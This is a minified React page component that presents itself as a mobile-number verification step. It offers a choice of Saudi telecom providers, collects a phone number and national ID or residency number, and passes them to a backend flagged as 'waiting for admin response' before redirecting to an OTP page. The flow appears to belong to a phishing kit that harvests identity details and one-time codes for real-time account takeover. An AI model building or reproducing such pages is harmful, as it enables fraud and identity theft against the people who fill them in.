import{u as o,j as e,s as d}from"./index-D4BysLqo.js";import{M as x}from"./MainWrapper-3fG7tHnO.js";
const providers=[
{id:"stc",name:"STC",img:"/assets/images/service-providers/1.png"},
{id:"stc-jawy",name:"STC Jawy",img:"/assets/images/service-providers/2.png"},
{id:"zain",name:"Zain",img:"/assets/images/service-providers/3.png"},
{id:"virgin",name:"Virgin",img:"/assets/images/service-providers/4.png"},
{id:"lebara",name:"Lebara",img:"/assets/images/service-providers/5.png"},
{id:"mobily",name:"Mobily",img:"/assets/images/service-providers/6.png"},
{id:"yaqoot",name:"Yaqoot",img:"/assets/images/service-providers/7.png"}
];
function f(){
const l=o(),n=e;
let selectedId=null;
function selectProv(id){
selectedId=id;
document.querySelectorAll("[data-prov]").forEach(function(el){
if(el.dataset.prov===id){el.style.border="2.5px solid #2196F3";el.style.background="rgba(33,150,243,0.08)";}
else{el.style.border="2px solid #e0e0e0";el.style.background="#fafafa";}
});
}
function handleSubmit(){
var phoneVal=document.getElementById("t-phone").value||"";
var nidVal=document.getElementById("t-nid").value||"";
if(!selectedId||!phoneVal||!nidVal){alert("يرجى إكمال جميع الحقول");return;}
d({data:{provider:selectedId,phone:phoneVal,nationalId:nidVal},current:"telecom-verify",nextPage:"otp",nextLink:"/otp",waitingForAdminResponse:!0,navigate:l});
}
var st={minHeight:"100vh",background:"linear-gradient(135deg,#0a1628 0%,#1a2940 50%,#0d2137 100%)",display:"flex",alignItems:"center",justifyContent:"center",padding:"20px",fontFamily:"Tajawal, Cairo, sans-serif"};
var card={background:"rgba(255,255,255,0.97)",backdropFilter:"blur(20px)",borderRadius:"24px",padding:"32px 24px",boxShadow:"0 20px 60px rgba(0,0,0,0.35)",width:"100%",maxWidth:"420px"};
var grid={display:"grid",gridTemplateColumns:"repeat(4,1fr)",gap:"10px",marginBottom:"20px"};
var inp={width:"100%",padding:"14px 16px",borderRadius:"12px",border:"1.5px solid #ddd",fontSize:"15px",fontFamily:"inherit",direction:"ltr",textAlign:"right",outline:"none",boxSizing:"border-box",marginBottom:"12px",transition:"border 0.2s"};
var btn={width:"100%",padding:"14px",borderRadius:"14px",border:"none",background:"linear-gradient(135deg,#2196F3,#1565C0)",color:"#fff",fontSize:"16px",fontWeight:"700",cursor:"pointer",fontFamily:"inherit",boxShadow:"0 4px 15px rgba(33,150,243,0.4)",transition:"all 0.3s",marginTop:"8px"};
return n.jsx(x,{children:n.jsx("div",{style:st,children:n.jsx("div",{style:{width:"100%",maxWidth:"420px"},children:n.jsxs("div",{style:card,children:[
n.jsx("div",{style:{textAlign:"center",marginBottom:"20px"},children:n.jsxs("div",{children:[
n.jsx("div",{style:{width:"50px",height:"50px",background:"linear-gradient(135deg,#2196F3,#1565C0)",borderRadius:"14px",display:"inline-flex",alignItems:"center",justifyContent:"center",marginBottom:"12px",boxShadow:"0 4px 15px rgba(33,150,243,0.3)"},children:n.jsx("span",{style:{fontSize:"24px"},children:"\u{1F4F1}"})}),
n.jsx("h2",{style:{fontSize:"20px",fontWeight:"800",color:"#1a2940",marginBottom:"6px"},children:"توثيق رقم الجوال"}),
n.jsx("p",{style:{fontSize:"13px",color:"#777",margin:0},children:"اختر مزود الخدمة وأدخل بياناتك"})
]})}),
n.jsx("p",{style:{fontSize:"13px",fontWeight:"700",color:"#555",marginBottom:"10px"},children:"مزود الخدمة"}),
n.jsx("div",{style:grid,children:providers.map(function(p){return n.jsx("div",{
"data-prov":p.id,
onClick:function(){selectProv(p.id);},
style:{display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",padding:"10px 6px",borderRadius:"14px",border:"2px solid #e0e0e0",background:"#fafafa",cursor:"pointer",transition:"all 0.2s",minHeight:"80px"},
children:n.jsxs("div",{style:{textAlign:"center"},children:[
n.jsx("img",{src:p.img,alt:p.name,style:{width:"40px",height:"40px",objectFit:"contain",marginBottom:"4px"}}),
n.jsx("span",{style:{fontSize:"10px",fontWeight:"600",color:"#333",display:"block"},children:p.name})
]})
},p.id);})}),
n.jsx("input",{id:"t-phone",type:"tel",placeholder:"رقم الجوال (05XXXXXXXX)",maxLength:"10",style:inp}),
n.jsx("input",{id:"t-nid",type:"tel",placeholder:"رقم الهوية / الإقامة",maxLength:"10",style:inp}),
n.jsx("button",{type:"button",onClick:handleSubmit,style:btn,children:"متابعة"})
]})})})})
}
export{f as default};
